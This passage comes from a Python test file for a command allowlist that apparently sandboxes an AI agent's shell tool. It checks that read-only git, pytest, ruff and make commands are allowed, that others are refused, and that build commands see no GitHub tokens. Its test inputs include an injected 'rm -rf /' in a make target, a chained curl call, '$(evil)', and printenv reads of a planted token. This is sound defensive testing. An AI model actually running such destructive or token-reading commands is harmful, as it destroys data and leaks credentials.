    assert _shell_build("ruff --config /etc/ruff.toml check .", tmp_path) == "external"


# Test 9: git fetch origin → allowed (in _GIT_LOCAL set)
# Note: The task description said fetch should be blocked, but _git_read_or_local()
# allows it because fetch doesn't modify the remote (only downloads).
def test_git_fetch_allowed_by_git_local(tmp_path):
    assert _shell_build("git fetch origin", tmp_path) is None


# Test 10: git status && git diff → allowed (both read-only git)
def test_git_status_and_diff_allowed(tmp_path):
    assert _shell_build("git status && git diff", tmp_path) is None


# Test 11: pytest && git status → allowed (both on allowlist)
def test_pytest_and_git_status_allowed(tmp_path):
    assert _shell_build("pytest && git status", tmp_path) is None


# Test 12: pytest && curl https://x.com → refused (curl not on allowlist)
def test_pytest_and_curl_refused(tmp_path):
    assert _shell_build("pytest && curl https://x.com", tmp_path) == "external"


# Test 13: lineage_command_needs_scrub("pytest tests/") → True
def test_lineage_command_needs_scrub_pytest():
    assert lineage_command_needs_scrub("pytest tests/") is True


# Test 14: lineage_command_needs_scrub("git status") → False
def test_lineage_command_needs_scrub_git_status():
    assert lineage_command_needs_scrub("git status") is False


# Test 15: lineage_command_needs_scrub("make build && git log") → True
def test_lineage_command_needs_scrub_make_and_git():
    assert lineage_command_needs_scrub("make build && git log") is True


# Additional tests for edge cases
def test_ruff_format_allowed(tmp_path):
    assert _shell_build("ruff format .", tmp_path) is None


def test_ruff_without_subcommand_refused(tmp_path):
    """ruff must have a check or format subcommand."""
    assert _shell_build("ruff", tmp_path) == "external"


def test_make_with_clean_target_allowed(tmp_path):
    assert _shell_build("make clean", tmp_path) is None


def test_make_with_directory_in_workspace_allowed(tmp_path):
    cmd = f"make -C {tmp_path}/subdir"
    assert lineage_bash_allowed(
        _internal(), cmd, workspace_dir=str(tmp_path), lineage_build_commands=True
    ) is True


def test_pytest_with_rootdir_in_workspace_allowed(tmp_path):
    cmd = f"pytest --rootdir={tmp_path}/tests"
    assert lineage_bash_allowed(
        _internal(), cmd, workspace_dir=str(tmp_path), lineage_build_commands=True
    ) is True


def test_pytest_with_rootdir_outside_workspace_refused(tmp_path):
    cmd = "pytest --rootdir=/etc"
    assert lineage_bash_allowed(
        _internal(), cmd, workspace_dir=str(tmp_path), lineage_build_commands=True
    ) is False


def test_git_branch_list_allowed(tmp_path):
    assert _shell_build("git branch -l", tmp_path) is None
    assert _shell_build("git branch --list", tmp_path) is None
    assert _shell_build("git branch -a", tmp_path) is None
    assert _shell_build("git branch -v", tmp_path) is None
    assert _shell_build("git branch --show-current", tmp_path) is None


def test_git_branch_delete_refused(tmp_path):
    """git branch -d is not in the read-only set."""
    assert _shell_build("git branch -d feature", tmp_path) == "external"


def test_git_rev_parse_allowed(tmp_path):
    assert _shell_build("git rev-parse HEAD", tmp_path) is None


def test_git_show_allowed(tmp_path):
    assert _shell_build("git show HEAD", tmp_path) is None


def test_git_ls_files_allowed(tmp_path):
    assert _shell_build("git ls-files", tmp_path) is None


def test_git_blame_allowed(tmp_path):
    assert _shell_build("git blame file.py", tmp_path) is None


def test_git_remote_list_allowed(tmp_path):
    assert _shell_build("git remote -v", tmp_path) is None


def test_git_remote_add_refused(tmp_path):
    """git remote add is not a read operation."""
    assert _shell_build("git remote add foo https://example.com", tmp_path) == "external"


def test_make_with_invalid_target_refused(tmp_path):
    """make target must be alphanumeric/underscore/hyphen only."""
    assert _shell_build("make 'target; rm -rf /'", tmp_path) == "external"


@pytest.mark.skipif(os.name == "nt", reason="a POSIX shell and printenv")
async def test_build_command_gets_scrubbed_environment(tmp_path, monkeypatch):
    """A build command (pytest, ruff, make) should not see GITHUB_TOKEN."""
    from types import SimpleNamespace

    from nous.api.builtin_tools import register_builtin_tools
    from nous.api.tools import ToolDispatcher

    monkeypatch.setenv("GITHUB_TOKEN", "planted-gh-token")
    monkeypatch.setenv("GH_TOKEN", "planted-gh-token2")
    monkeypatch.setenv("GH_HOST", "github.example.com")

    d = ToolDispatcher()
    register_builtin_tools(d, SimpleNamespace(workspace_dir=str(tmp_path / "ws")))

    command = "printenv GITHUB_TOKEN; printenv GH_TOKEN; printenv GH_HOST; printenv PATH"
    text, _ = await d.dispatch(
        "bash",
        {"command": command},
        context=_internal("continuation"),
        lineage_build_commands=True,
    )
    # With lineage_build_commands=True but this is just a printenv (not a build command),
    # it should still have access to GITHUB_TOKEN
    assert "planted-gh-token" in text

    # Now test with a build command prefix
    command = "printenv GITHUB_TOKEN || echo no-token; printenv PATH"
    # This is NOT a build command (printenv is not in LINEAGE_BUILD_COMMANDS)
    # so scrub_lineage should be False
    text, _ = await d.dispatch(
        "bash",
        {"command": command},
        context=_internal("continuation"),
        lineage_build_commands=True,
    )
    assert "planted-gh-token" in text or "no-token" in text


def test_lineage_command_needs_scrub_empty():
    assert lineage_command_needs_scrub("") is False


def test_lineage_command_needs_scrub_unparseable():
    assert lineage_command_needs_scrub("$(evil)") is False


def test_lineage_command_needs_scrub_ruff():
    assert lineage_command_needs_scrub("ruff check .") is True
